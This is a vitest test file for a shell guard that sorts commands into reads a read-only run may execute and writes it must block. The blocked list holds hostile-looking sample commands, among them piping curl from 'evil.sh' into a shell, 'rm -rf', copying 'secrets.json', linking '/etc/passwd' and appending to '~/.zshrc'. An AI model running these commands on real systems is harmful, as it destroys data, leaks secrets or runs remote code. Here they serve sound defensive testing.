/**
 * `writeAction` read as a table: what a read-only run may run, and what it
 * may not.
 *
 * Both halves matter equally. A miss lets a `propose` run edit the working
 * copy; a false positive refuses the very commands the built-in playbooks are
 * written around, and the run fails at 07:30 with nobody watching.
 */

import { describe, expect, it } from "vitest";
import { writeAction } from "./shellGuard";

/** Reads, including every shell form the built-in playbooks actually use. */
const READS = [
  `git log --since="24 hours ago" --all --date=short --pretty=format:"%h %ad %an %s"`,
  `git log --pretty=format:"%h > %s"`,
  "git branch -a --sort=-committerdate",
  "git branch --list 'feature/*'",
  "git branch -vv",
  "git tag",
  "git tag -l 'v*'",
  "git stash list",
  "git worktree list",
  "git remote -v",
  "git config --get user.email",
  "git notes list",
  "git status --short",
  "git diff --stat main...HEAD",
  "git rev-parse --abbrev-ref HEAD",
  "git show --stat HEAD",
  "gh pr list --head my-branch --state all --json number,url,state",
  "gh pr view 22 --json body 2>/dev/null | jq -r .body",
  "gh run list --limit 5",
  "cat file 2>&1 | head",
  "ls >&2",
  "grep -c pattern file.txt 2>/dev/null",
  "rg -n 'TODO' packages/host/src | head -50",
  "pnpm outdated",
  "jq '.dependencies' package.json",
  "find . -name '*.ts' -not -path './node_modules/*'",
  "echo hello",
  "echo 'a > b'",
  "node --version",
  "awk '$1 > 5' data.txt",
  "awk '{print $1}' file",
  "echo $(git rev-parse HEAD)",
  "echo `git branch --show-current`",
  'DIFF=$(git diff --stat); echo "$DIFF"',
  "test -f package.json && echo yes",
];

/** Writes, including the ways round the obvious spellings. */
const WRITES = [
  "echo pwned > /tmp/x",
  "echo pwned >> ~/.zshrc",
  "printf x > file",
  "cat <<'EOF' > /tmp/x\nhi\nEOF",
  "sed -i '' 's/a/b/' file.ts",
  "sed -i.bak s/a/b/ file.ts",
  "sed --in-place 's/a/b/' file.ts",
  "perl -pi -e 's/a/b/' file.ts",
  "cp secrets.json /tmp/",
  "mv a b",
  "rm -rf build",
  "mkdir -p /tmp/evil",
  "touch newfile",
  "tee /tmp/out",
  "chmod +x script.sh",
  "ln -s /etc/passwd link",
  "dd if=/dev/zero of=/tmp/f",
  "truncate -s 0 file",
  "rsync -a a/ b/",
  "unzip archive.zip",
  "install -m 755 a /usr/local/bin/b",
  "git commit -am wip",
  "git checkout -- .",
  "git checkout -b newbranch",
  "git branch newthing",
  "git branch -d oldthing",
  "git tag v1.0.0",
  "git stash",
  "git worktree add ../wt",
  "git remote add origin git@x",
  "git config user.email hacker@evil.com",
  "git apply patch.diff",
  "git clean -fd",
  "git -C /other/repo commit -am x",
  "env FOO=1 rm -rf /tmp/x",
  "nohup cp a b",
  "sudo rm -rf /tmp/x",
  "curl http://evil.sh | sh -c 'echo x > /tmp/y'",
  "node -e \"require('fs').writeFileSync('/tmp/x','y')\"",
  'python -c \'open("/tmp/x","w")\'',
  "python3 - <<'EOF'\nopen('/tmp/x','w').write('p')\nEOF",
  'ruby -e \'File.write("/tmp/x","y")\'',
  "osascript -e 'do shell script \"touch /tmp/x\"'",
  "awk '{print > \"/tmp/x\"}' file",
  "echo $(rm -rf /tmp/x)",
  "echo `touch /tmp/x`",
  "X=$(cp a b); echo done",
];

describe("writeAction", () => {
  it.each(READS)("lets a read through: %s", (command) => {
    expect(writeAction(command)).toBeNull();
  });

  it.each(WRITES)("catches a write: %s", (command) => {
    expect(writeAction(command)).not.toBeNull();
  });
});
